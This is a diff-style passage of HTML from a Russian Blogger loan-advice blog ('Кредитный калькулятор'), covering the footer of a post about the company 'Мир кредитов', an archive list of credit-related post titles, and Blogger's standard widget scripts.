class='share-button-link-text'>Опубликовать в Twitter</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=2135239325400794714&postID=7552603447337825286&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Опубликовать в Facebook'><span class='share-button-link-text'>Опубликовать в Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=2135239325400794714&postID=7552603447337825286&target=pinterest' target='_blank' title='Поделиться в Pinterest'><span class='share-button-link-text'>Поделиться в Pinterest</span></a>
+</div>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+<span class='post-labels'>
+</span>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+<span class='post-location'>
+</span>
+</div>
+</div>
+</div>
+<div class='comments' id='comments'>
+<a name='comments'></a>
+<h4>Комментариев нет:</h4>
+<div id='Blog1_comments-block-wrapper'>
+<dl class='avatar-comment-indent' id='comments-block'>
+</dl>
+</div>
+<p class='comment-footer'>
+<div class='comment-form'>
+<a name='comment-form'></a>
+<h4 id='comment-post-message'>Отправить комментарий</h4>
+<p>
+</p>
+<a href='https://www.blogger.com/comment-iframe.g?blogID=2135239325400794714&postID=7552603447337825286' id='comment-editor-src'></a>
+<iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410px' id='comment-editor' name='comment-editor' src='' width='100%'></iframe>
+<script src='https://www.blogger.com/static/v1/jsbin/3095219799-comment_from_post_iframe.js' type='text/javascript'></script>
+<script type='text/javascript'>
+      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
+    </script>
+</div>
+</p>
+</div>
+</div>
+
+        </div></div>
+      
+</div>
+<div class='blog-pager' id='blog-pager'>
+<span id='blog-pager-newer-link'>
+<a class='blog-pager-newer-link' href='http://lasiperear.blogspot.com/2014/03/blog-post_157.html' id='Blog1_blog-pager-newer-link' title='Следующее'>Следующее</a>
+</span>
+<span id='blog-pager-older-link'>
+<a class='blog-pager-older-link' href='http://lasiperear.blogspot.com/2014/03/blog-post_8046.html' id='Blog1_blog-pager-older-link' title='Предыдущее'>Предыдущее</a>
+</span>
+<a class='home-link' href='http://lasiperear.blogspot.com/'>Главная страница</a>
+</div>
+<div class='clear'></div>
+<div class='post-feeds'>
+<div class='feed-links'>
+Подписаться на:
+<a class='feed-link' href='http://lasiperear.blogspot.com/feeds/7552603447337825286/comments/default' target='_blank' type='application/atom+xml'>Комментарии к сообщению (Atom)</a>
+</div>
+</div>
+</div></div>
+</div>
+</div>
+<div class='column-left-outer'>
+<div class='column-left-inner'>
+<aside>
+</aside>
+</div>
+</div>
+<div class='column-right-outer'>
+<div class='column-right-inner'>
+<aside>
+<div class='sidebar section' id='sidebar-right-1'><div class='widget Profile' data-version='1' id='Profile1'>
+<h2>Обо мне</h2>
+<div class='widget-content'>
+<dl class='profile-datablock'>
+<dt class='profile-data'>
+<a class='profile-name-link g-profile' href='https://www.blogger.com/profile/00934092951384776586' rel='author' style='background-image: url(//www.blogger.com/img/logo-16.png);'>
+Рома
+</a>
+</dt>
+</dl>
+<a class='profile-link' href='https://www.blogger.com/profile/00934092951384776586' rel='author'>Просмотреть профиль</a>
+<div class='clear'></div>
+</div>
+</div><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
+<h2>Архив блога</h2>
+<div class='widget-content'>
+<div id='ArchiveList'>
+<div id='BlogArchive1_ArchiveList'>
+<ul class='hierarchy'>
+<li class='archivedate expanded'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy toggle-open'>
+
+        &#9660;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://lasiperear.blogspot.com/2014/'>
+2014
+</a>
+<span class='post-count' dir='ltr'>(19)</span>
+<ul class='hierarchy'>
+<li class='archivedate expanded'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy toggle-open'>
+
+        &#9660;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://lasiperear.blogspot.com/2014/03/'>
+марта
+</a>
+<span class='post-count' dir='ltr'>(19)</span>
+<ul class='posts'>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_7089.html'>Как рассчитываются проценты по кредитной карте аль...</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_2319.html'>Мтс телефон в кредит минск</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/18.html'>Кредиты с 18 лет без поручителей</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_1557.html'>Рус кредит банк траст</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/2131.html'>Ваз 2131 в кредит</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_8918.html'>Кредиты наличными дельта банк</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_8860.html'>Кредит от ренессанс банка украина</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_8581.html'>Кредиты в оаэ</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_9893.html'>Как оплатить кредит в сбербанке через интернет</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_1113.html'>Кредитные карты с льготным периодом на снятие нали...</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_5044.html'>Номер телефона хоум кредит энд финанс банк</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_4631.html'>Оформить онлайн заявку на кредит наличными</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_8894.html'>Банк ренессанс кредит во владимире</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_1197.html'>Доход для кредита</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_157.html'>Деньги на дом кредит</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_9772.html'>Компания мир кредитов</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_8046.html'>Статистика кредита и страхования</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post_25.html'>Мособлбанк кредит наличными</a></li>
+<li><a href='http://lasiperear.blogspot.com/2014/03/blog-post.html'>Узнать остаток на кредитной карте хоум кредит</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div class='clear'></div>
+</div>
+</div></div>
+</aside>
+</div>
+</div>
+</div>
+<div style='clear: both'></div>
+<!-- columns -->
+</div>
+<!-- main -->
+</div>
+</div>
+<div class='main-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+<footer>
+<div class='footer-outer'>
+<div class='footer-cap-top cap-top'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+<div class='fauxborder-left footer-fauxborder-left'>
+<div class='fauxborder-right footer-fauxborder-right'></div>
+<div class='region-inner footer-inner'>
+<div class='foot no-items section' id='footer-1'></div>
+<table border='0' cellpadding='0' cellspacing='0' class='section-columns columns-2'>
+<tbody>
+<tr>
+<td class='first columns-cell'>
+<div class='foot no-items section' id='footer-2-1'></div>
+</td>
+<td class='columns-cell'>
+<div class='foot no-items section' id='footer-2-2'></div>
+</td>
+</tr>
+</tbody>
+</table>
+<!-- outside of the include in order to lock Attribution widget -->
+<div class='foot section' id='footer-3'><div class='widget Attribution' data-version='1' id='Attribution1'>
+<div class='widget-content' style='text-align: center;'>
+Тема "Простая". Технологии <a href='https://www.blogger.com' target='_blank'>Blogger</a>.
+</div>
+<div class='clear'></div>
+</div></div>
+</div>
+</div>
+<div class='footer-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</footer>
+<!-- content -->
+</div>
+</div>
+<div class='content-cap-bottom cap-bottom'>
+<div class='cap-left'></div>
+<div class='cap-right'></div>
+</div>
+</div>
+</div>
+<script type='text/javascript'>
+    window.setTimeout(function() {
+        document.body.className = document.body.className.replace('loading', '');
+      }, 10);
+  </script>
+<script src='https://apis.google.com/js/plusone.js' type='text/javascript'></script>
+
+<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/296009378-widgets.js"></script>
+<script type='text/javascript'>
+window['__wavt'] = 'AOuZoY6XQG15GLpr2CtS_hcA9eOgRX6lWw:1629825804453';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d2135239325400794714','//lasiperear.blogspot.com/2014/03/blog-post_9772.html','2135239325400794714');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '2135239325400794714', 'title': '\u041a\u0440\u0435\u0434\u0438\u0442\u043d\u044b\u0439 \u043a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440', 'url': 'http://lasiperear.blogspot.com/2014/03/blog-post_9772.html', 'canonicalUrl': 'http://lasiperear.blogspot.com/2014/03/blog-post_9772.html', 'homepageUrl': 'http://lasiperear.blogspot.com/', 'searchUrl': 'http://lasiperear.blogspot.com/search', 'canonicalHomepageUrl': 'http://lasiperear.blogspot.com/', 'blogspotFaviconUrl': 'http://lasiperear.blogspot.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': false, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'ru', 'localeUnderscoreDelimited': 'ru', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22\u041a\u0440\u0435\u0434\u0438\u0442\u043d\u044b\u0439 \u043a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440 - Atom\x22 href\x3d\x22http://lasiperear.blogspot.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22\u041a\u0440\u0435\u0434\u0438\u0442\u043d\u044b\u0439 \u043a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440 - RSS\x22 href\x3d\x22http://lasiperear.blogspot.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22\u041a\u0440\u0435\u0434\u0438\u0442\u043d\u044b\u0439 \u043a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440 - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/2135239325400794714/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22\u041a\u0440\u0435\u0434\u0438\u0442\u043d\u044b\u0439 \u043a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440 - Atom\x22 href\x3d\x22http://lasiperear.blogspot.com/feeds/7552603447337825286/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'ieCssRetrofitLinks': '\x3c!--[if IE]\x3e\x3cscript type\x3d\x22text/javascript\x22 src\x3d\x22https://www.blogger.com/static/v1/jsbin/403901366-ieretrofit.js\x22\x3e\x3c/script\x3e\n\x3c![endif]--\x3e', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/9484e6b40060d994', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': '\u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0441\u0441\u044b\u043b\u043a\u0443', 'key': 'link', 'shareMessage': '\u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0441\u0441\u044b\u043b\u043a\u0443', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': '\u041f\u043e\u0434\u0435\u043b\u0438\u0442\u044c\u0441\u044f \u0432 Facebook', 'target': 'facebook'}, {'name': '\u041d\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u043e\u0431 \u044d\u0442\u043e\u043c \u0432 \u0431\u043b\u043e\u0433\u0435', 'key': 'blogThis', 'shareMessage': '\u041d\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u043e\u0431 \u044d\u0442\u043e\u043c \u0432 \u0431\u043b\u043e\u0433\u0435', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': '\u041f\u043e\u0434\u0435\u043b\u0438\u0442\u044c\u0441\u044f \u0432 Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': '\u041f\u043e\u0434\u0435\u043b\u0438\u0442\u044c\u0441\u044f \u0432 Pinterest', 'target': 'pinterest'}, {'name': '\u042d\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u043d\u0430\u044f \u043f\u043e\u0447\u0442\u0430', 'key': 'email', 'shareMessage': '\u042d\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u043d\u0430\u044f \u043f\u043e\u0447\u0442\u0430', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27ru\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': '\u0414\u0430\u043b\u0435\u0435...', 'pageType': 'item', 'postId': '7552603447337825286', 'postImageUrl': 'http://farm3.staticflickr.com/2855/13384484993_9b44361d76_m.jpg', 'pageName': '\u041a\u043e\u043c\u043f\u0430\u043d\u0438\u044f \u043c\u0438\u0440 \u043a\u0440\u0435\u0434\u0438\u0442\u043e\u0432', 'pageTitle': '\u041a\u0440\u0435\u0434\u0438\u0442\u043d\u044b\u0439 \u043a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440: \u041a\u043e\u043c\u043f\u0430\u043d\u0438\u044f \u043c\u0438\u0440 \u043a\u0440\u0435\u0434\u0438\u0442\u043e\u0432'}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': '\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u044c', 'linkCopiedToClipboard': '\u0421\u0441\u044b\u043b\u043a\u0430 \u0441\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0430 \u0432 \u0431\u0443\u0444\u0435\u0440 \u043e\u0431\u043c\u0435\u043d\u0430!', 'ok': '\u041e\u041a', 'postLink': '\u0421\u0441\u044b\u043b\u043a\u0430 \u043d\u0430 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': '\u0414\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u043e', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true, 'variant': 'simplysimple', 'variantId': 'simplysimple'}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': '\u041a\u043e\u043c\u043f\u0430\u043d\u0438\u044f \u043c\u0438\u0440 \u043a\u0440\u0435\u0434\u0438\u0442\u043e\u0432', 'description': '\u041e \u043a\u043e\u043c\u043f\u0430\u043d\u0438\u0438 - \u043c\u0438\u0440 \u043a\u0440\u0435\u0434\u0438\u0442\u0430 - \u043e \u043a\u043e\u043c\u043f\u0430\u043d\u0438\u0438 \u043c\u0438\u0440 \u043a\u0440\u0435\u0434\u0438\u0442\u0430 \u2013 \u043c\u043e\u043b\u043e\u0434\u0430\u044f \u044d\u043d\u0435\u0440\u0433\u0438\u0447\u043d\u043e \u0440\u0430\u0437\u0432\u0438\u0432\u0430\u044e\u0449\u0430\u044f\u0441\u044f \u043a\u043e\u043c\u043f\u0430\u043d\u0438\u044f \u043f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u043e\u043d\u0430\u043b\u043e\u0432, \u043a\u0440\u0435\u0434\u0438\u0442 \u0432 \u044e\u043d\u0438\u043a\u0440\u0435\u0434\u0438\u0442 \u0431\u0430\u043d\u043a\u0435 \u043f\u043e\u043b\u0443\u0447\u0438...', 'featuredImage': 'https://lh5.googleusercontent.com/proxy/F8w-zArddG3OR_gqQV23G_W0SvZVm5qeunJqcmjeTUp01_4ROpR5JwrgGaVRZJzQvuKT7ng9eD6J6q3EdDGK2dnp0ZZ4RmSHkcKcFxC-v5uSnVY', 'url': 'http://lasiperear.blogspot.com/2014/03/blog-post_9772.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 7552603447337825286}}]);
+_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/732950853-lbx__ru.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/4076883957-lightbox_bundle.css'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_ProfileView', new _WidgetInfo('Profile1', 'sidebar-right-1', document.getElementById('Profile1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-1', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': '\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430\x26hellip;'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', document.getElementById('Attribution1'), {}, 'displayModeFull'));
+</script>
+</body>
+</html>
